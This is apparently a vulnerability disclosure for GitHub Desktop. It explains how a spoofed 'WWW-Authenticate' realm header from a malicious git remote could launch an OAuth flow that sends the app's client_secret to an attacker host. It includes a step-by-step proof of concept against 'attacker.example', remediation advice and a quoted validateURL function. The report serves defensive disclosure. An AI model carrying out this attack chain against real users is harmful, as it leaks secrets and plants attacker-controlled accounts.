## Title
Spoofed `WWW-Authenticate: realm="GitHub"` from a malicious git remote tricks Desktop into starting an OAuth flow (leaking the app's client secret) against an attacker-controlled host — (File: `app/src/lib/trampoline/trampoline-credential-helper.ts`)

### Summary
The reported Astaria bug is a case of a state-changing endpoint trusting an attacker-supplied field (`receiver`) instead of validating it against the authenticated/signed source of truth (`params.incoming`). The GitHub Desktop analog is the credential-helper trampoline's endpoint-classification logic, which trusts an HTTP response header supplied by whatever git server the user happens to be talking to (fully attacker-controlled if the user fetches from/clones a malicious remote or goes through a malicious proxy) to decide that host is a legitimate "GitHub Enterprise" endpoint — and then feeds that attacker-controlled host into the real OAuth sign-in flow, including Desktop's embedded `client_secret`.

### Finding Description
When git needs credentials for a remote, it invokes Desktop's credential helper trampoline with fields it collected from the server, including any `WWW-Authenticate` header the remote sent on a 401 response (`wwwauth[]`). `getEndpointKind` treats this attacker-controlled header as authoritative: [1](#0-0) 

If the header contains `realm="GitHub"`, the target is classified `'enterprise'` — a value chosen entirely by the remote server, not by the git host or any GitHub-issued identity proof.

`getCredential` then uses that classification: since there is no locally stored account matching this attacker host, it calls into the sign-in UI using the attacker-controlled `endpoint` (derived straight from git's `host`/`protocol` fields, i.e., the actual remote URL/proxy): [2](#0-1) 

`promptForGitHubSignIn` treats any non-`github.com` hostname as a legitimate GitHub Enterprise instance and starts the enterprise sign-in flow against it: [3](#0-2) 

`_setSignInEndpoint`/`validateURL` only checks that the URL is syntactically `https:` — there is no allowlist of known/verified enterprise hosts: [4](#0-3) 

`authenticateWithBrowser` then opens the system browser to `${attackerEndpoint}/login/oauth/authorize` using Desktop's real, embedded `client_id` and a CSRF `state` that is visible in the URL: [5](#0-4) 

Because the attacker's page can see the `state` value in the query string, it can trivially satisfy the state check in `resolveOAuthRequest`: [6](#0-5) 

That check passes, so `requestOAuthToken(endpoint, code)` — where `endpoint` is still the attacker's origin — POSTs the app's `client_id` **and `client_secret`** to the attacker's server, and whatever `access_token`/user object the attacker returns is bound into Desktop as a new signed-in account: [7](#0-6) 

The corrupted value is the `endpoint` used for the OAuth token exchange: it is supposed to be a vetted, user-confirmed enterprise host, but here it is silently derived from an unauthenticated header sent by whatever server the current git operation happened to talk to, with no cross-check against a known/verified enterprise endpoint list.

### Impact Explanation
- Exfiltration of Desktop's embedded OAuth `client_secret` and `client_id` to an attacker-controlled server via `requestOAuthToken`.
- Unauthorized account binding: the attacker fully controls the `code`/`access_token`/user profile returned, so an attacker-chosen "account" gets added to the user's Desktop `AccountsStore` as a trusted GitHub Enterprise identity.
- This requires no prior trust: only that the user perform a normal git operation (fetch/clone/push) against a repository whose remote is attacker-controlled, or that traffic passes through an attacker-controlled proxy that can inject a `WWW-Authenticate` header.

### Likelihood Explanation
The trigger is a single crafted HTTP 401 response header (`WWW-Authenticate: Basic realm="GitHub"`) from any server the app's git subprocess talks to during a normal, unprivileged operation (clone/fetch/push to an attacker-supplied or attacker-influenced remote URL). This is fully within the described "attacker controls a git remote/proxy response" primitive, requires no local access, no prior credentials, and no unnatural user steps beyond adding/using a remote the attacker controls — something Desktop explicitly supports (adding arbitrary remotes, cloning arbitrary URLs).

### Recommendation
- Do not let the git-supplied `WWW-Authenticate` realm string alone classify a host as `'enterprise'`; treat it only as a hint to prompt generic credential entry, not to launch the OAuth authorization flow with the app's real `client_id`/`client_secret`.
- Before initiating `authenticateWithBrowser`/`requestOAuthToken` against a host discovered this way, require it to pass the same `isGitHubHost` verification (or explicit user confirmation) used elsewhere, and never send `client_secret` to a host that hasn't been positively verified as a GitHub Enterprise API endpoint.
- Bind the OAuth `state`/callback validation to the specific `endpoint` that initiated the flow so a token exchange can't be redirected/POSTed to an unexpected host discovered via credential-helper heuristics.

### Proof of Concept
1. Attacker hosts a git-over-HTTPS server (or a MITM proxy in front of any URL) that responds to Desktop's `dugite`/git credential probe with `401` and header `WWW-Authenticate: Basic realm="GitHub"`.
2. Victim adds this URL as a remote (or clones it) in GitHub Desktop and performs a fetch/push, triggering the credential-helper trampoline.
3. `getEndpointKind` misclassifies the host as `'enterprise'` (`trampoline-credential-helper.ts:153-165`).
4. No existing account matches, so `ui.promptForGitHubSignIn(attackerEndpoint)` is invoked, which begins an enterprise sign-in against the attacker's host (`trampoline-ui-helper.ts:86-93`), passing `enterprise-validate-url.ts`'s bare `https:` check.
5. Desktop opens the system browser to `https://attacker.example/login/oauth/authorize?client_id=<real_id>&state=<csrf>`.
6. Attacker's page immediately redirects to `x-github-desktop-auth://oauth?code=<attacker_code>&state=<csrf>` (state value taken straight from the referring URL).
7. Desktop's `resolveOAuthRequest` accepts the matching state and calls `requestOAuthToken('https://attacker.example', code)`, POSTing the real `client_id`/`client_secret` to the attacker's `/login/oauth/access_token`.
8. Attacker's server returns an arbitrary `access_token`; `fetchUser` fetches an attacker-controlled `/user` response; the resulting account is added to the victim's Desktop as a trusted signed-in account.

Uncertainty: I did not find/verify Desktop's exact `ClientID`/`ClientSecret` values (they are build-time constants) nor runtime confirmation that `shell.openExternal`/deep-link round-trip behaves exactly as traced without executing the app; this analysis is based on static code review of the cited files. Full end-to-end confirmation would require running the app.

export function validateURL(address: string): string {
  // ensure user has specified text and not just whitespace
  // we will interact with this server so we can be fairly
  // relaxed here about what we accept for the server name
  const trimmed = address.trim()
  if (trimmed.length === 0) {
    const error = new Error('Unknown address')
    error.name = InvalidURLErrorName
    throw error
  }

  let url = URL.parse(trimmed)
  if (!url.host) {
    // E.g., if they user entered 'ghe.io', let's assume they're using https.
    address = `https://${trimmed}`
    url = URL.parse(address)
  }

  if (!url.protocol) {
    const error = new Error('Invalid URL')
    error.name = InvalidURLErrorName
    throw error
  }

  if (url.protocol !== 'https:') {
    const error = new Error('Invalid protocol')
    error.name = InvalidProtocolErrorName
    throw error
  }

  return address
}
